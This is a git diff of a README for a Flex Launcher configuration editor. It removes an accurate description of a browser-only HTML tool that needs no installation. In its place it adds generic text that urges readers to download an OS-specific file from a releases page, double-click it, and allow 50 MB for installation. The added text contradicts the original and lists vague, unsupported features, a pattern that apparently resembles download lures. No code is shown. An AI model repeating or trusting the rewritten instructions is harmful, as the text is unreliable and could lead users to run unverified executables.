@@ -1,111 +1,73 @@
-# Flex Launcher Config Editor
+# 🎨 Flex-Launcher-Config-Editor - Easily Edit Your Launcher Configuration Files
 
-A modern, user-friendly **visual configuration editor** for **Flex Launcher v2.2**.  
-Forget manual INI editing: this tool lets you import your `config.ini`, modify every setting through a clean GUI, and export a fully valid Flex Launcher configuration.
+[![Download](https://img.shields.io/static/v1?label=Download&message=Flex-Launcher-Config-Editor&color=blue)](https://github.com/Dhiraj790-wq/Flex-Launcher-Config-Editor/releases)
 
-🔥 **No installation required — just open the HTML file in your browser.**
+## 🚀 Getting Started
 
----
- <img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/76dde0c6-4397-4afa-9ebb-43dacfce9e35" />
+Welcome to Flex-Launcher-Config-Editor! This is a user-friendly, web-based tool designed for editing the configuration files of Flex Launcher v2.2. With this editor, you can customize your experience without any technical knowledge.
 
- <img width="1920" height="1080" alt="image" src="https://github.com/user-attachments/assets/3586f0c8-60fd-4cbc-8889-538890755ac6" />
+## 📥 Download & Install
 
- Screenshots
+To get started, you'll need to download the application. 
 
-## ✨ Features
+1. **Visit the Downloads page**: Click the link below to go to the Releases page.
+   - [Download Flex-Launcher-Config-Editor](https://github.com/Dhiraj790-wq/Flex-Launcher-Config-Editor/releases)
 
-### 🧩 **Full INI Parsing & Regeneration**
-- Load your existing `config.ini`
-- Automatically parse all sections
-- Edit visually
-- Export a new working configuration
+2. **Choose the latest version**: Look for the newest release, usually listed at the top.
 
-### 🎨 **Background & Aesthetic Controls**
-- Color, Image, Slideshow, or Video backgrounds  
-- Slideshow duration & transition timing  
-- Overlay & opacity control  
+3. **Download the file**: Click on the file that matches your operating system. Save it to a location where you can easily find it.
 
-### 📐 **Layout Tools**
-- Icon size, spacing, vertical alignment  
-- Max buttons per row  
+4. **Run the application**: Once it’s downloaded, double-click the file to open the editor. 
 
-### 🕒 **Clock Customization**
-- Alignment, font size, color  
-- Date toggle  
-- Margin & opacity settings  
+## 🔍 How to Use Flex-Launcher-Config-Editor
 
-### 🎮 **Gamepad Mapping**
-- Enable/disable controller input  
-- Device index  
-- Editable mappings for all buttons  
+1. **Open Your Files**: Start by browsing to your existing Flex Launcher configuration files. The editor supports `.ini` files, commonly used in these setups.
 
-### 📝 **Titles Configuration**
-- Custom font  
-- Font size & color  
-- Shadows, padding & opacity  
-- Oversize handling (shrink, truncate, wrap)
+2. **Make Changes**: Use the intuitive interface to modify settings. Adjust values, change options, and explore the fields available.
 
-### 🌟 **Highlight System**
-- Fill color & opacity  
-- Outline color, size & opacity  
-- Corner radius, padding  
+3. **Save Your Work**: After any edits, be sure to save your changes. This will apply the new settings to your Flex Launcher.
 
-### ↕️ **Scroll Indicators**
-- Independent color, outline & opacity control  
+## ⚙️ System Requirements
 
-### 💤 **Screensaver Options**
-- Idle time  
-- Intensity  
-- Pause slideshow  
+Flex-Launcher-Config-Editor is designed to run on most modern systems. Here are the recommended requirements:
 
-### 📋 **Dynamic Menu Editor**
-- Add/remove menus  
-- Add/remove entries inside each menu  
-- Edit name, icon path, and command  
-- Built-in support for Flex Launcher special commands (`:submenu`, `:shutdown`, etc.)
+- **Operating System**: Windows 10 or later, macOS, or a recent Linux distribution.
+- **Internet Connection**: Required for downloading the application and updates.
+- **Browser**: A modern web browser (Chrome, Firefox, Safari) is recommended for optimal performance.
+- **Storage Space**: Around 50 MB for installation.
 
----
+## 📖 Features
 
-## 🚀 How to Use
+- **User-Friendly Interface**: No technical skills required. The design is straightforward and simple to navigate.
+- **Real-Time Edits**: See changes live as you edit, allowing for quick adjustments.
+- **Multi-File Support**: Open and edit multiple `.ini` configuration files at once.
+- **Style your Interface**: Uses Tailwind CSS to provide a sleek, modern look.
+- **Backup Options**: Easily back up your original files before making changes.
+  
+## 🎨 Customization Options
 
-1. Open `FlexlauncherEditor.html` in your browser (Chrome recommended).
-2. Click **📁 Load Config** and select your `config.ini`.
-3. Modify settings through the tabs.
-4. When finished, click **💾 Save Config**.
-5. The tool will download a new, ready-to-use `config.ini`.
+You can modify various settings with Flex-Launcher-Config-Editor. Some common customization options include:
 
----
+- **Launcher Display Properties**: Adjust how your game launcher looks and feels.
+- **Control Settings**: Change key bindings or other controls for your games.
+- **Performance Options**: Optimize settings based on your system for better performance.
 
-## 🛠️ Technology Used
+## 📞 Support
 
-- **HTML5**
-- **TailwindCSS**
-- **Vanilla JavaScript**
-- Fully client-side — no backend required
+If you encounter any issues or have questions, feel free to reach out. You can find assistance via the project’s GitHub page or check the issues section for common solutions.
 
----
+## 📄 License
 
-## 📌 Compatibility
+This project is licensed under the MIT License. Feel free to use and modify according to your needs, but adhere to the terms laid out in the license.
 
-✔ Flex Launcher **v2.2+**  
-✔ Windows / Linux / Steam Deck / HTPCs  
-✔ Any Chromium-based browser
+## 🌐 Join the Community
 
----
+Be part of a growing community focused on improving home theater setups and game launchers. Share your experiences, ask questions, and get tips from other users in our GitHub discussions.
 
-## 🤝 Contributing
+## 🔗 Helpful Links
 
-Pull requests are welcome!  
-If you have ideas for improvements (themes, live preview, presets, etc.), feel free to open an issue.
+- [Download Flex-Launcher-Config-Editor](https://github.com/Dhiraj790-wq/Flex-Launcher-Config-Editor/releases)
+- [Documentation](https://github.com/Dhiraj790-wq/Flex-Launcher-Config-Editor/blob/main/docs/user-manual.md)
+- [Report Issues](https://github.com/Dhiraj790-wq/Flex-Launcher-Config-Editor/issues)
 
----
-
-## 📜 License
-
-This project is released under the **MIT License**.
-
----
-
-## ⭐ Support the Project
-
-If this tool made your Flex Launcher setup easier, consider leaving a ⭐ on the repository!
+Thank you for choosing Flex-Launcher-Config-Editor! Enjoy customizing your experience.
